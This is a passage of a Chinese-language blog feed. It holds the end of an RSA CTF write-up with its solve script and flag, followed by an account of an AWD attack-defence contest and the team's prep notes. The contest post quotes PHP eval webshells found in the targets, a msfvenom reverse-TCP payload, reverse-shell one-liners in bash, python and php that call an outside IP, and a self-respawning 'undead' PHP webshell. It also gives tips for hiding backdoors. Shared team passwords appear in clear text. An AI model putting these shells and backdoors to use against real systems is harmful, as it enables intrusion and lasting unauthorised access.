class="built_in">print</span>(<span class="string">&quot;n&quot;</span>, p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;k&quot;</span>, k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc&quot;</span>, enc)</span><br><span class="line"><span class="comment">#n = 764789710135699120066739558828098633577013306253421553430847195908034244362783426399681889172711929793563731863384139872322402736681090085666598621114324939409408964563306677742741428195863966989898498906831204752157005288028055139678360291316075877219030667685558110323821117721956754066208709423674599070852863328081495564626811408881020379619280834606394873439653313479059367387482717449792132890040814302415880441497255508283415162957128101398055871020323457216741679183472993371932538507867941404875130906965322325847739960927163953539809036794727803609900302282116111729856921452995125114084009947877974251520302979592670067613546606144401980991349553446645445805493512099309153534117016242573188431650384053169169037929526267038289233193459168030309932136331042640250813278140485915435024593329769782476261202489190771392735516338128092461124553594475652005536021219004598007475896848018535883345275525698202912140165492830229318458220859621536946916060728450732293426918231002157025978449298255884607961112874423611768107044113994666509578842156149561812558917421973274685922015605898024562717582262195308188734233843441532414373538708641762976079302448555298697105806160447760545580129674268456624678445339254341281619657391</span></span><br><span class="line"><span class="comment">#e = 65537</span></span><br><span class="line"><span class="comment">#k = 11376230879464757138290711299984908778464289005173308608189545435463525777268265977729128994228398091834020517958489408848527244519720030536561582611244172458641332639632981518360153087977263620583037286868169984156081495975325137150308201181821183705406433865681037783672009245951450744893423967519534524564872374719067025656950703655360275719627553370956932353637447232396991057691540662128565377895571740302756624004115592822652032877787683190174651306416910281916239819514603714322474683948222133746696116347630808594215555899448203106168014521796360515931362871133025281314243806320464177354177591228332335003551614106832308993911767231860241219942930903683175017203214440697826698228720134550320203010201162227480574211558033922830875117868895970801183417628548046732735178684031479465866770555097097049039401697156697973726498505003813383696303149763801522877588926847414588086172187481338569607545109010485980789181176815929895776940791230453092924387422291052184177606568352378605741988346025715326590594607822822612290794021218154340474272030636989456754518795702696600378337733961339618639033487933752890208434609460829539754273357617487166483257224739734126886305602260084115687043018921964438528469917594211427068125222889990486298031116975211308319185008573568652053973895884503801570264426091699176024805955546836991196229298757508243251307657063191639987383783941231455894746140575040062497070116929901714063774213552073013057990495816268901523247960107878691144148350592800965125699719038873342744331101838577313168280165305316417387319080806526792235761499758367535234473231638455540814177514642349235328627096125963532214440347089295557895745448430528014032156116184317483847359679936198373071447646642313893200567858353913090847963730766120387076016399374559419994285225024354973914324859198201290795827297428960819444555465333396</span></span><br><span class="line"><span class="comment">#enc = 412093036715903128816790953795699287022044216068094761688962237067827011617922387939870348912875721751778771109858780403824076311902683730492233931750791970774429713426105151785974216855033623062170836476535146856670899254646842108216255981889833334584536802754025396041247764488790105972219057375460371490647125698609400300341077029080773163205863745828608512034607447580944258673896462752843386985550199652916670962124910468248134403955249972471292321362551835390767312197538200826967705545638519964452471211583957033796921294363923837791013671753387403623271493340254878112019414988938587497894192020830896786221505942049263600607820879465571254636671934958681859231524860851162323564163724658591380505948307672122532671989440138584048326517351031499576198020315578054570580122064097161740727146596055708533260148164018981133880628043807746488833455752164612507117536000447164187430205500714960736257690852385172040877083740844061320535351927024358525062923099609550661254084283782830424441345671163835622431355492805291956376976262133352159700906015781429216234017365670205976334239654019004580276209764555902322660518746581075014319520704136021241687389064873964101439926478194416552866446689392251268071780662459334135965480296</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">764789710135699120066739558828098633577013306253421553430847195908034244362783426399681889172711929793563731863384139872322402736681090085666598621114324939409408964563306677742741428195863966989898498906831204752157005288028055139678360291316075877219030667685558110323821117721956754066208709423674599070852863328081495564626811408881020379619280834606394873439653313479059367387482717449792132890040814302415880441497255508283415162957128101398055871020323457216741679183472993371932538507867941404875130906965322325847739960927163953539809036794727803609900302282116111729856921452995125114084009947877974251520302979592670067613546606144401980991349553446645445805493512099309153534117016242573188431650384053169169037929526267038289233193459168030309932136331042640250813278140485915435024593329769782476261202489190771392735516338128092461124553594475652005536021219004598007475896848018535883345275525698202912140165492830229318458220859621536946916060728450732293426918231002157025978449298255884607961112874423611768107044113994666509578842156149561812558917421973274685922015605898024562717582262195308188734233843441532414373538708641762976079302448555298697105806160447760545580129674268456624678445339254341281619657391</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">k = <span class="number">11376230879464757138290711299984908778464289005173308608189545435463525777268265977729128994228398091834020517958489408848527244519720030536561582611244172458641332639632981518360153087977263620583037286868169984156081495975325137150308201181821183705406433865681037783672009245951450744893423967519534524564872374719067025656950703655360275719627553370956932353637447232396991057691540662128565377895571740302756624004115592822652032877787683190174651306416910281916239819514603714322474683948222133746696116347630808594215555899448203106168014521796360515931362871133025281314243806320464177354177591228332335003551614106832308993911767231860241219942930903683175017203214440697826698228720134550320203010201162227480574211558033922830875117868895970801183417628548046732735178684031479465866770555097097049039401697156697973726498505003813383696303149763801522877588926847414588086172187481338569607545109010485980789181176815929895776940791230453092924387422291052184177606568352378605741988346025715326590594607822822612290794021218154340474272030636989456754518795702696600378337733961339618639033487933752890208434609460829539754273357617487166483257224739734126886305602260084115687043018921964438528469917594211427068125222889990486298031116975211308319185008573568652053973895884503801570264426091699176024805955546836991196229298757508243251307657063191639987383783941231455894746140575040062497070116929901714063774213552073013057990495816268901523247960107878691144148350592800965125699719038873342744331101838577313168280165305316417387319080806526792235761499758367535234473231638455540814177514642349235328627096125963532214440347089295557895745448430528014032156116184317483847359679936198373071447646642313893200567858353913090847963730766120387076016399374559419994285225024354973914324859198201290795827297428960819444555465333396</span></span><br><span class="line">enc = <span class="number">412093036715903128816790953795699287022044216068094761688962237067827011617922387939870348912875721751778771109858780403824076311902683730492233931750791970774429713426105151785974216855033623062170836476535146856670899254646842108216255981889833334584536802754025396041247764488790105972219057375460371490647125698609400300341077029080773163205863745828608512034607447580944258673896462752843386985550199652916670962124910468248134403955249972471292321362551835390767312197538200826967705545638519964452471211583957033796921294363923837791013671753387403623271493340254878112019414988938587497894192020830896786221505942049263600607820879465571254636671934958681859231524860851162323564163724658591380505948307672122532671989440138584048326517351031499576198020315578054570580122064097161740727146596055708533260148164018981133880628043807746488833455752164612507117536000447164187430205500714960736257690852385172040877083740844061320535351927024358525062923099609550661254084283782830424441345671163835622431355492805291956376976262133352159700906015781429216234017365670205976334239654019004580276209764555902322660518746581075014319520704136021241687389064873964101439926478194416552866446689392251268071780662459334135965480296</span></span><br><span class="line">r = <span class="number">663111019425944540514080507309</span></span><br><span class="line">aa=<span class="built_in">pow</span>(<span class="number">2</span>,e*k+r-<span class="number">1</span>,n)-<span class="number">1</span></span><br><span class="line">p=gmpy2.gcd(aa,n) <span class="comment">#最大公约数求p</span></span><br><span class="line">q=n/p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.powmod(enc,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m)[::-<span class="number">1</span>]) <span class="comment">#转换为字符串反向</span></span><br><span class="line"><span class="comment">#ZJCTF(f0r_w311_inj3ct&#125;</span></span><br></pre></td></tr></table></figure><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a href="https://www.youtube.com/watch?v=D_kMadCtKp8">RSA加密算法</a></p><p><a href="https://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86">费马小定理</a></p><p><a href="https://www.youtube.com/watch?v=aIt1TNj8yKw">费马是如何检验素数的？杨辉三角形和素数有什么关系？</a></p><p><a href="https://www.youtube.com/watch?v=xqol4-uziE0">基于欧拉函数的RSA算法加密原理是什么？RSA算法详解</a></p><p><a href="https://xz.aliyun.com/t/2708">例题</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;费马小定理与证明&quot;&gt;&lt;a href=&quot;#费马小定理与证明&quot; class=&quot;headerlink&quot; title=&quot;费马小定理与证明&quot;&gt;&lt;/a&gt;费马小定理与证明&lt;/h1&gt;&lt;h2 id=&quot;杨辉三角&quot;&gt;&lt;a href=&quot;#杨辉三角&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>awd总结</title>
    <link href="https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/"/>
    <id>https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/</id>
    <published>2020-09-08T02:43:51.000Z</published>
    <updated>2025-02-14T14:45:19.305Z</updated>
    
    <content type="html"><![CDATA[<p>打了一场线下市赛,为awd模式，每个队伍两台靶机防守，一台web1是typecho，一台web2是YznCMSV1.0，前期准备是两个防守，一个攻击，当进入比赛时，环境出了问题，我这个攻击选手进不去，加固时间都已经过了，我赶紧连上去以后下载源码，D盾一扫发现几个木马，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">c:\users\iloveflag\desktop\<span class="number">172.20</span>.<span class="number">131.102</span>\application\pay\controller\api.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">alipay_callback</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;param&#x27;</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$param</span>);</span><br><span class="line"></span><br><span class="line">c:\users\iloveflag\desktop\<span class="number">172.20</span>.<span class="number">131.102</span>\application\pay\library\service.php</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$pay</span> = <span class="title class_">Pay</span>::<span class="variable">$type</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">getConfig</span>(<span class="variable">$type</span>));</span><br><span class="line">            <span class="variable">$get</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;&#x27;</span>, <span class="literal">null</span>, <span class="string">&#x27;trim&#x27;</span>);</span><br><span class="line">            <span class="comment">//去除空值</span></span><br><span class="line">            <span class="variable">$get</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$get</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$v&#x27;</span>, <span class="string">&#x27;return !empty($v);&#x27;</span>));</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$type</span> == <span class="string">&#x27;wechat&#x27;</span> ? <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>) : <span class="variable">$get</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$pay</span>-&gt;<span class="title function_ invoke__">verify</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$data</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$pay</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>然后删除，后面我看其他队伍都上了waf，我们也上了awd-watchbird-master这款waf，web2上了waf后直接主页上不去了，web1前期没有发现漏洞，只能先上waf扛着，暂时页面正常，我一发现web2down掉以后，直接删除了web目录，开始还原，但是页面可以访问，但是主页直接不行了，后面一直checkdown裁判一直扣分，赛后和其他队伍交流后说还原无效的，web2有个小bug，要自己修日志文件？我木掉了。反正web2已经checkdown了，索性上了waf，防止其他队伍找到bug拿flag，然后转向web1，到了下午的时候，发现队伍一直扣flag分，怀疑web1被下了不死马，因为前期web1上过waf，日志发现有个队伍从index.php/api/alipay_callback连接入侵，但是我一开始以为alipay是web2的漏洞，对手在全局扫描，后面看到不死马发现不对，但是全局搜索alipay没有发现这个api，只能删除了整个web目录，然后还原，发现对方又在public，目录下了一个.blue3.php的不死马，我只能再次还原，然后新建一个.blue3.php的文件，权限111,后面发现一个skyexp.php，对方一直在和我纠缠，而且通过日志知道对方将web权限维持到了他的8080端口，linux服务器这边w发现他一直在，但是可恶的是我这边不是root权限，是ctf用户，也重启不了nginx，kill也踢不出对方www-data用户的权限维持，这就造成比赛体验极差，而且对方拿flag也就算了，直接将index目录下php文件全部删除，只有几个目录，我只能让另外的队友一直还原了，后面想到可以先给自己下马，web端进去就是www-data权限了，随后pkill -kill -t pts/0 踢用户，后续就是和对方不断地比手速，对方还从.1的ip换到.2的ip，不知道是不是两个队友一起上了，直到比赛结束，看了一下其他队伍web1也都是被这个队伍搞了，web1服务器直接挂了，web2一样页面访问错误checkdown扣分，后面一个队伍就是准备了几个靠谱的waf，没有扣分，排名也很靠前，第一次打awd。只能说前期准备不足，本人自己是去攻击的，到了现场全程在运维防守，队友web1上午也一直连接不上~前期准备的防火墙，改mysql之类的都没用上</p><p>前期的准备文档(其实没有什么软子用):<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">加waf:</span><br><span class="line">find /var/www/html -name &quot;*.php&quot;|xargs sed -i &quot;s#&lt;?php#&lt;?php\ninclude_once(&#x27;/var/www/html/log.php&#x27;);\n#g&quot;</span><br><span class="line">防火墙配置</span><br><span class="line"></span><br><span class="line">linux:</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=8080  -f elf -o shell</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">防火墙:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示当前开放的服务</span></span><br><span class="line">[root@192 ~]# firewall-cmd --list-services</span><br><span class="line">dhcpv6-client http https mysql ssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firewall-cmd --add-service=mysql        # 开放mysql端口</span><br><span class="line">firewall-cmd --remove-service=http      # 阻止http端口</span><br><span class="line">firewall-cmd --list-services            # 查看开放的服务</span><br><span class="line">firewall-cmd --add-port=3306/tcp        # 开放通过tcp访问3306</span><br><span class="line">firewall-cmd --remove-port=80tcp        # 阻止通过tcp访问3306</span><br><span class="line">firewall-cmd --add-port=233/udp         # 开放通过udp访问233</span><br><span class="line">firewall-cmd --list-ports               # 查看开放的端口</span><br><span class="line"></span><br><span class="line">mysql禁止远程登录:</span><br><span class="line">防火墙设置:firewall-cmd --remove-service=mysql</span><br><span class="line">mysql数据库层面:</span><br><span class="line">允许远程登录:</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">删除:</span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2 \config\config_global.php</span><br><span class="line">Wordpress \wp-config.php</span><br><span class="line">Metinfo \include\head.php</span><br><span class="line"></span><br><span class="line">删除不死马:</span><br><span class="line">ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure></p><p>awd简介与分工﴾全部要做﴿<br>服务器ssh等密码统一改为nbccserver95，webshell密码为<br>nbccshell95,mysql密码nbccmysql95<br>三人一组，两个攻击，一个防守<br>前期准备（30分钟）<br>将源码打包<br>tar ‐cvf html.tar ./<br>监听还原脚本‐&gt;5分钟还原一次<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   awd.py</span></span><br><span class="line"><span class="string">@Time    :   2020/08/09 20:44:54</span></span><br><span class="line"><span class="string">@Author  :   iloveflag </span></span><br><span class="line"><span class="string">@Version :   1.0</span></span><br><span class="line"><span class="string">@Contact :   iloveflag@outlook.com</span></span><br><span class="line"><span class="string">@Desc    :  The Win32 port can only create tar archives,</span></span><br><span class="line"><span class="string">            but cannot pipe its output to other programs such as gzip or compress, </span></span><br><span class="line"><span class="string">            and will not create tar.gz archives; you will have to use or simulate a batch pipe.</span></span><br><span class="line"><span class="string">            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,</span></span><br><span class="line"><span class="string">            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;</span></span><br><span class="line"><span class="string">            for most purposes it is to be preferred to GNU Tar. </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_command</span>(<span class="params">command,transport</span>): <span class="comment">#对服务器执行命令</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh._transport = transport</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(command)</span><br><span class="line">    <span class="comment"># print(stdout.read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_file_action</span>(<span class="params">ip, port, user, passwd, action</span>): <span class="comment">#对服务器文件操作</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        transport = paramiko.Transport(ip, <span class="built_in">int</span>(port))</span><br><span class="line">        transport.connect(username=user, password=passwd)</span><br><span class="line">        sftp = paramiko.SFTP.from_transport(transport)</span><br><span class="line">        remote_path=<span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line">        remote_file = <span class="string">&#x27;html.tar&#x27;</span></span><br><span class="line">        local_path = <span class="string">&#x27;C:/Users/&#x27;</span>+os.getlogin()+<span class="string">&#x27;/Desktop/awd/&#x27;</span>+ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        web_server_command(<span class="string">&#x27;cd &#x27;</span>+remote_path+<span class="string">&#x27; &amp;&amp; tar -cvf &#x27;</span>+remote_file+<span class="string">&#x27; ./&#x27;</span>,transport)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span>(os.path.exists(local_path)):</span><br><span class="line">            os.makedirs(local_path)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            sftp.get(remote_path+remote_file,local_path+remote_file)</span><br><span class="line">            web_server_command(<span class="string">&#x27;rm -rf &#x27;</span>+remote_path+remote_file,transport)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器源码保存在&#x27;</span>+local_path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在解压:&#x27;</span>)</span><br><span class="line">            os.system(<span class="string">&#x27;cd &#x27;</span>+local_path+<span class="string">&#x27; &amp; tar -xvf &#x27;</span>+remote_file+<span class="string">&#x27; &amp;del &#x27;</span>+remote_file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;文件解压完成&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            web_server_command(<span class="string">&#x27;rm -rf &#x27;</span>+remote_path+<span class="string">&#x27;*&#x27;</span>,transport)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;清理服务器web目录&#x27;</span>)</span><br><span class="line">            os.system(<span class="string">&#x27;cd &#x27;</span>+local_path+<span class="string">&#x27; &amp; tar -cvf &#x27;</span>+remote_file+<span class="string">&#x27; ./*&#x27;</span>)</span><br><span class="line">            sftp.put(local_path+remote_file, remote_path+remote_file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;上传成功&#x27;</span>)</span><br><span class="line">            web_server_command(<span class="string">&#x27;cd &#x27;</span>+remote_path+<span class="string">&#x27;&amp;&amp; tar -xvf &#x27;</span>+remote_file+<span class="string">&#x27; &amp;&amp; rm -rf &#x27;</span>+remote_file,transport)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还原完毕&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-----------------------------&#x27;</span>)</span><br><span class="line">        sftp.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;download or upload error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_mysql_action</span>():</span><br><span class="line">    <span class="comment">#web_server_mysql_action</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_status</span>():</span><br><span class="line">    <span class="comment">#web_server_status</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    web1_server_ip=<span class="string">&#x27;172.20.131.101&#x27;</span></span><br><span class="line">    web1_server_port=<span class="string">&#x27;22&#x27;</span></span><br><span class="line">    web1_server_user=<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">    web1_server_passwd=<span class="string">&#x27;nbccserver95&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;倒计时&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;秒&#x27;</span>)</span><br><span class="line">    web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, <span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><br>vscode‐&gt;ssh插件，实时在线编辑<br>5台linux服务器，非root用户<br>httpd‐&gt;apache用户<br>nginx‐&gt;wwdata用户<br>攻击:<br>环境<br>至少有一台linux的主机桥接<br>masscan ‐p80,22 192.168.0.1/24 ‐‐rate==1000<br>比nmap快<br>或者arp‐scan<br>代码审计<br>工具:D盾，seay源码审计，rip<br>一般会有最简单的eval后门，反序列化漏洞，命令执行<br>危险函数查找:eval,assert,system等<br>一些常见的cms通用漏洞<br>Metinfo 6.0.0 众多漏洞分析<br>找完以后告诉防守更改文件<br>默认密码批量扫描<br>拿到密码后先更改，然后用默认密码去批量登录其他的主机<br>后门隐藏<br>…目录<br>.shell.php<br>ls看不见<br>一句话反弹shell<br>bash<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ‐i &gt;&amp; /dev/tcp/192.168.0.103/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><br>python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python ‐c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.S</span></span><br><span class="line"><span class="string">OCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2</span></span><br><span class="line"><span class="string">(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;‐i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><br>php<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php ‐r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.31.41&quot;,8080);exec(&quot;/bin/sh ‐i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;</span></span><br><span class="line"><span class="string">3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><br>反弹的端口 192.168.10.234，则端口为8234，统一管理<br>不死马<br>php文件循环生成，建议放在…目录，文件名为.index.php<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;./.index.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;3a50065e1709acc47ba0c9238294364f&quot;)</span><br><span class="line">&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;;</span><br><span class="line">//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&amp;a=command</span><br><span class="line">while (1)&#123;</span><br><span class="line">file_put_contents($file,$code);</span><br><span class="line">usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>防守:<br>弱口令<br>大多是mysql，在php文件如config.php中可以看见信息<br>mysql更改密码:xxx<br>mysql禁止远程登录:xxx<br>防火墙配置<br>ubuntu‐ufw<br>centos7‐firewalld<br>centos6‐iptables<br>网上有awd配置防火墙的一键脚本<br>如：只允许团队的ip登录主机，只开放80，22端口<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 